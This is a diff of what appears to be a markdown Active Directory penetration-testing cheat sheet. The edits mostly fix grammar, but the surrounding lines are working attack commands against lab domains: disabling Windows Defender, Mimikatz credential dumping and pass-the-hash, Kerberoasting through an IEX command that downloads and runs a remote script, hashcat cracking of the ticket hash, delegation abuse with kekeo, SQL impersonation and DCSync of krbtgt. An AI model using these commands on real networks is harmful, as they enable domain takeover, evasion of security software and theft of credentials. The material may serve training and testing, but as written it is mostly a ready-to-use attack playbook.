@@ -4,7 +4,7 @@ Domain Demolition with Frank Castle and Powershell.
 
 
 ## Basic Domain Enumeration
-Gathering information using Powerview.ps1
+Gathering information using Powerview.ps1:
 ```
 PS C:\ad> Get-NetDomain
 
@@ -38,15 +38,14 @@ TargetName               : disney.local
 TrustType                : Forest
 TrustDirection           : Bidirectional
 ```
- In order to find machines across the trust we need to specify the domain
-```
 
+In order to find machines inside the trust, we need to specify the domain:
+```
 PS C:\ad> (Get-DomainComputer -Domain disney.local).name
 DS-DC1
 DS-DBREPORT
 DS-ITSTAFF
 DS-MICKEY
-
 ```
 
 ## Lateral movement:
@@ -78,13 +77,13 @@ PS C:\Windows\system32> $sess = New-PSSession -ComputerName HYDRA
 PS C:\Windows\system32> invoke-Command -ScriptBlock {whoami} -Session $sess
 marvel\administrator
 ```
-Get Computer list that curent user have access to:
+Get Computers list that curent user has access to:
 
 ```
 $computers=( Get-WmiObject -Namespace root\directory\ldap -Class ds_computer | select  -ExpandProperty ds_cn)
 foreach ($computer in $computers) { (Get-WmiObject Win32_ComputerSystem -ComputerName $computer ).Name }
 ```
-Get Computer list that target $user have access to
+Get Computers list that target user has access to:
 ```
 $Username = 'domain\user'
 $Password = ConvertTo-SecureString -AsPlainText 'password'-Force
@@ -95,7 +94,7 @@ $computers=( Get-WmiObject -Namespace root\directory\ldap -Class ds_computer | s
 
 foreach ($computer in $computers) { (Get-WmiObject Win32_ComputerSystem -ComputerName $computer -Credential $cred ).Name }
 ```
-Get Sql instances that current user have access to:
+Get SQL instances that current user has access to:
 ```
 PS C:\> Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded 
 
@@ -108,14 +107,14 @@ UFC-SQLDev.marvel.local    SQLDev.marvel.local               Accessible
 
 ## Local Privileges Escalation
 ### Basic Enumeration:
-Automated Enumeration with PowerUp.ps1
+Automated Enumeration with PowerUp.ps1:
 ```
 PS C:\>. .\PowerUp.ps1
 PS C:\>Invoke-AllChecks 
 ```
 
 ### AV and AMSI Evasion:
-TO bypass amsi and defender, there is possibility to turn if off with local administrator privileges:
+To bypass AMSI and Defender, there is a possibility to turn them off with Local Administrator privileges:
 ```
 Set-MpPreference -DisableIOAVProtection $true
 Set-MpPreference -DisableRealtimeMonitoring $true
@@ -125,12 +124,12 @@ Set-MpPreference -DisableRealtimeMonitoring $true
 invoke-mimikatz -dumpcred 
 invoke-mimikatz -command 'privilege::debug token::elevate lsadump::sam'
 ```
-### Passin the hashes with Mimikatz 
+### Passing hashes with Mimikatz 
 ```
 Invoke-Mimikatz -command "sekurlsa::pth /user:Administrator /domain:MARVEL /ntlm:58a478135a93ac3bf058a5ea0e8fdb71 /run:C:\Users\fcastle\Desktop\PsExec64.exe" 
 ```
 
-## Domain Privileges Escalation 
+## Domain Privilege Escalation 
 ### Looking for weak ACL in domain
 ```
 Invoke-ACLScanner | Where-Object {$_.IdentityReference –eq $userName}
@@ -149,7 +148,7 @@ Description           : Key Distribution Center Service Account
 SPNServers            :
 SPNTypes              : {kadmin}
 ServicePrincipalNames : {kadmin/changepw}
-
+​
 Domain                : marvel.local
 UserID                : spn1
 PasswordLastSet       : 01/07/2020 08:31:28
@@ -159,12 +158,10 @@ SPNServers            : {hydra.marvel.local}
 SPNTypes              : {http}
 ServicePrincipalNames : {http/hydra.marvel.local:80}
 ```
-
 Performing the attack:
 
 ```
 PS C:\Users\pparker> IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1') ; Invoke-Kerberoast
-
 
 TicketByteHexStream  :
 Hash                 : $krb5tgs$http/hydra.marvel.local:80:38E8FD090742C0D1FFA26A56527F2A3F$71AF4E87BBE558A3B1C654A39942586DDD8D1A101E5097113E0F449D0EF39A4FA8BC2778B87CED04DDBDA5D79AA9ED374B08957185B1B636606124127EC6CE9D93A544B0C9B416CCAED7E003ABF5E2FA9EF646279EEAF0F55F
@@ -180,7 +177,7 @@ SamAccountName       : spn1
 DistinguishedName    : CN=spn1,CN=Users,DC=marvel,DC=local
 ServicePrincipalName : http/hydra.marvel.local:80
 ```
-In order to crack Kerberos 5 TGS-REP etype 23 hash run hashcat: `hashcat64.exe -m 13100 hash.txt rockyou.txt`
+In order to crack Kerberos 5 TGS-REP etype 23 hash, use hashcat: `hashcat64.exe -m 13100 hash.txt rockyou.txt`
 
 ```
 Watchdog: Temperature abort trigger set to 90c
@@ -215,13 +212,13 @@ Stopped: Tue Jan 07 10:12:19 2020
 ```
 
 ### Unconstrained Delegation
-Looking for machines that allow unconstrained delegation.
+Looking for machines that allow unconstrained delegation:
 ```
 PS C:\ad> (Get-DomainComputer -Unconstrained).cn 
 MVU-DC1
 MVU-PROD
 ```
-In order to perform attack, MVU-PROD should be compromised and following command need to be executed:
+In order to perform the attack, MVU-PROD should be compromised and following command needs to be executed:
 ```
 Invoke-Mimikatz –Command '"sekurlsa::tickets /export"
 Invoke-Mimikatz –Command '"kerberos::ptt C:\ad\SOMEUSER.kirbi"
@@ -231,10 +228,9 @@ Looking for machines that allow constrained delegation:
 ```
 PS C:\ad> (Get-DomainComputer -TrustedToAuth).cn 
 MVU-DB
-
 ```
-Looking for object allowed to be delegated
 
+Looking for object allowed to be delegated:
 ```
 PS C:\ad\ADModule-master> Import-Module .\Microsoft.ActiveDirectory.Management.dll
 PS C:\ad\ADModule-master> Get-ADObject  -Filter {msDS-AllowedToDelegateTo -ne "$null"}
@@ -268,11 +264,10 @@ PS C:\ad> kekeo.exe "tgt::ask /user:someservice /domain:us.marvel.local /ntlm:${
 PS C:\ad>  kekeo.exe "tgs::s4u /tgt:TGT_someservice@US.MARVEL.LOCAL_krbtgt~us.marvel.local@US.MARVEL.LOCAL.kirbi /user:Administrator@us.marvel.local /service:time/MVU-DC1.us.marvel.local|ldap/MVY-DC1.us.marvel.local
 
 Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@us.marvel.local@US.MARVEL.LOCAL_ldap~UFC-DC1.us.marvel.local@US.MARVEL.LOCAL_ALT.kirbi"'
-
 ```
-### SQL Server Escalation
-Check impersonation possibilities
 
+### SQL Server Escalation
+Check impersonation possibilities:
 ```
 PS C:\> Get-SQLQuery -Instance $instance -Verbose -Query "select distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'"
 VERBOSE: MVU-SQL.us.marvel.local : Connection Success.
@@ -307,7 +302,7 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:marvel\krbtgt"
 ## Escalation Across Domain Trust
 Admin of child domain, krbtgt hash, access to DC
 
-Getting the "sids" of the parent domain 
+Getting the "sids" of the parent domain:
 ```
 PS C:\ad> (New-Object System.Security.Principal.NTAccount("disney.local","krbtgt")).Translate([System.Security.Principal.SecurityIdentifier]).Value
 S-1-5-21-493355955-4213530352-789496340-502
